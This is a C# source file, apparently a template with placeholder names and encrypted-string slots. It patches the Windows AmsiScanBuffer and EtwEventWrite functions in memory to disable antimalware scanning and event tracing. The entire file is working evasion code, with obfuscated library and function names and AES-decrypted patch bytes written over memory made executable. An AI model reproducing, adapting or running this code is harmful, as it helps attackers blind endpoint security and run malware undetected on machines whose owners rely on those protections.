using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace namespace_name
{
    internal class class_name
    {
        static void Main()
        {
            IntPtr kmodule = LoadLibrary("k" + "e" + "r" + "n" + "e" + "l" + "3" + "2" + "." + "d" + "l" + "l");
            IntPtr vpaddr = GetProcAddress(kmodule, "V" + "i" + "r" + "t" + "u" + "a" + "l" + "P" + "r" + "o" + "t" + "e" + "c" + "t");
            virtualprotect_name VirtualProtect = (virtualprotect_name)Marshal.GetDelegateForFunctionPointer(vpaddr, typeof(virtualprotect_name));
            byte[] patch;
            uint old;

            IntPtr amsimodule = LoadLibrary("a" + "m" + "s" + "i" + "." + "d" + "l" + "l");
            IntPtr asbaddr = GetProcAddress(amsimodule, Encoding.UTF8.GetString(aesfunction_name(Convert.FromBase64String("amsiscanbuffer_str"), Convert.FromBase64String("key_str"), Convert.FromBase64String("iv_str"))));
            if (IntPtr.Size == 8) patch = aesfunction_name(Convert.FromBase64String("amsi64patch_str"), Convert.FromBase64String("key_str"), Convert.FromBase64String("iv_str"));
            else patch = aesfunction_name(Convert.FromBase64String("amsipatch_str"), Convert.FromBase64String("key_str"), Convert.FromBase64String("iv_str"));
            VirtualProtect(asbaddr, (UIntPtr)patch.Length, 0x40, out old);
            Marshal.Copy(patch, 0, asbaddr, patch.Length);
            VirtualProtect(asbaddr, (UIntPtr)patch.Length, old, out old);

            IntPtr ntdll = LoadLibrary("n" + "t" + "d" + "l" + "l" + "." + "d" + "l" + "l");
            IntPtr etwaddr = GetProcAddress(ntdll, Encoding.UTF8.GetString(aesfunction_name(Convert.FromBase64String("etweventwrite_str"), Convert.FromBase64String("key_str"), Convert.FromBase64String("iv_str"))));
            if (IntPtr.Size == 8) patch = aesfunction_name(Convert.FromBase64String("etw64patch_str"), Convert.FromBase64String("key_str"), Convert.FromBase64String("iv_str"));
            else patch = aesfunction_name(Convert.FromBase64String("etwpatch_str"), Convert.FromBase64String("key_str"), Convert.FromBase64String("iv_str"));
            VirtualProtect(etwaddr, (UIntPtr)patch.Length, 0x40, out old);
            Marshal.Copy(patch, 0, etwaddr, patch.Length);
            VirtualProtect(etwaddr, (UIntPtr)patch.Length, old, out old);
        }

        static byte[] aesfunction_name(byte[] input, byte[] key, byte[] iv)
        {
            AesManaged aes = new AesManaged();
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;
            ICryptoTransform decryptor = aes.CreateDecryptor(key, iv);
            byte[] decrypted = decryptor.TransformFinalBlock(input, 0, input.Length);
            decryptor.Dispose();
            aes.Dispose();
            return decrypted;
        }

        [DllImport("kernel32.dll")]
        static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        delegate bool virtualprotect_name(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    }
}
